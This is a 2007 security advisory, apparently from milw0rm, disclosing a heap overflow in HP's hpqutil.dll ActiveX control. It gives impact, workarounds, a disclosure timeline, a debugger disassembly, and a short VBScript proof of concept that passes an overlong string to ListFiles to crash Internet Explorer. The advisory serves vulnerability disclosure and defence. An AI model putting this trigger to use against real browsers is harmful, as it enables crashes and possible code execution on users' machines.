@@ -1,0 +1,148 @@
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+ActiveX hpqutil!ListFiles hpqutil.dll - Remote heap overflow.
+=============================================================
+Internal ID: VULWAR200706041
+
+
+introduction
+------------
+GOODFELLAS security research team has found a bug in a dll included in at 
+least the following HP products: 
+
+* HP All-in-One Series Web Release 
+* HP Photo & Imaging Gallery version 1.1
+
+The affected dll is called hpqutil.dll at least in it's version 2.0.0.138 in 
+English, and specifically the problem is a heap overflow
+
+
+tested in
+---------
+Windows XP spanish with SP2
+
+
+summary
+-------
+
+
+Remotable exploitation of this heap overflow  could allow a user to execute 
+arbitriary code or crash internet explorer. The heap overflow is related to 
+a call to lstrcpyA() inside a function that is not checking the buffer's bounds. 
+This call is made from the FindFile() function the dll overloaded from MFC42. 
+The dll allocates 320 bytes for the buffer where some arbitrarily long user 
+input is to be stored.
+This bug is related with "FileFind class from MFC Library cause heap overflow"
+You could view more details in http://goodfellas.shellcode.com.ar/own/VULWKU200706142 
+
+
+impact
+------
+This exploitable bug crashes internet explorer and if used along other 
+techniques could allow for remote code execution. Explotation requires a 
+targetted user to load a web page containing the crafted activeX control with 
+internet explorer, it is also required to have activeX enabled.
+
+
+workaround
+----------
+- Unregistering hpqutil.dll using regsvr32
+- Activate the Kill bit zero in clsid F3F381A3-4795-41FF-8190-7AA2A8102F85
+
+
+timeline
+--------
+june 14, 2007 -- bug discovery
+june 20, 2007 -- vendor notification
+July 30, 2007 -- ping ... (no response)
+September 14, 2007 -- Bug published
+
+
+credits
+-------
+ * Brian Mariani <bmariani@shellcode.com.ar>
+ * Jonathan Sarba <sarbaj@shellcode.com.ar>
+ * GoodFellas Security Research Team <goodfellas.shellcode.com.ar>
+
+
+
+Proof of concept
+----------------
+[...]
+<object classid='clsid:F3F381A3-4795-41FF-8190-7AA2A8102F85' id='pAF'>
+</object>
+<input type="button" value="heap" language="VBScript" OnClick="OuCh()">
+<script language="VBScript">
+sub OuCh()
+ Var_0 = String(620, "A")
+ pAF.ListFiles Var_0
+End Sub
+</script>
+[...]
+
+
+technical detail
+----------------
+MFC42!CFileFind::FindFile
+[...]
+73d6cd3f 8bff            mov     edi,edi
+73d6cd41 55              push    ebp
+73d6cd42 56              push    esi
+73d6cd43 57              push    edi
+        => ecx=04ecedd4
+        => esi=0795cf24
+
+73d6cd44 8bf1            mov     esi,ecx
+73d6cd46 e89effffff      call    MFC42!CFileFind::Close (73d6cce9)
+73d6cd4b 6840010000      push    140h <<<====  320 bytes to allocate!!!!!
+73d6cd50 e8ce73feff      call    MFC42!operator new (73d54123)
+        => Allocating memory for the buffer (malloc)
+        => eax= 4170ec0
+
+73d6cd55 8b6c2414        mov     ebp,dword ptr [esp+14h]
+        => esp+14 has a pointer to the argument buffer (AAAAA...)
+
+73d6cd59 83661000        and     dword ptr [esi+10h],0
+73d6cd5d 85ed            test    ebp,ebp
+        => ebp=068b5064 (this is the address of the buffer)
+
+73d6cd5f 59              pop     ecx  <<<===== this is 140h
+73d6cd60 894608          mov     dword ptr [esi+8],eax
+        => eax=04170ec0
+
+73d6cd63 7505            jne     MFC42!CFileFind::FindFile+0x2b (73d6cd6a) (LSTRCPY)!
+        => strcpy(eax, ebp) where EBP="AAAAAA....\*.jpg"
+        => EAX  has 140h till it reaches the end of its scope
+
+73d6cd65 bda4d0df73      mov     ebp,offset MFC42!`string' (73dfd0a4)
+73d6cd6a 55              push    ebp
+73d6cd6b 83c02c          add     eax,2Ch
+[...]
+
+--------------------------------
+MFC42!operator new:
+73d54123 8bff            mov     edi,edi
+73d54125 53              push    ebx
+73d54126 55              push    ebp
+73d54127 8b6c240c        mov     ebp,dword ptr [esp+0Ch]
+73d5412b 56              push    esi
+73d5412c 57              push    edi
+73d5412d 8b3de466df73    mov     edi,dword ptr [MFC42!_imp__malloc (73df66e4)]
+73d54133 83cbff          or      ebx,0FFFFFFFFh
+[...]
+
+MFC42!CFileFind::FindFile+0x2b:
+73d6cd6a 55              push    ebp
+73d6cd6b 83c02c          add     eax,2Ch
+73d6cd6e 50              push    eax
+73d6cd6f ff15d061df73    call    dword ptr [MFC42!_imp__lstrcpyA (73df61d0)]
+                        => kernel32!lstrcpyA: access violation
+                        => vulnerable heap structure
+73d6cd75 ff7608          push    dword ptr [esi+8]
+73d6cd78 55              push    ebp
+73d6cd79 ff15d861df73    call    dword ptr [MFC42!_imp__FindFirstFileA (73df61d8)]
+73d6cd7f 83f8ff          cmp     eax,0FFFFFFFFh
+[...]
+
+# milw0rm.com [2007-09-14]
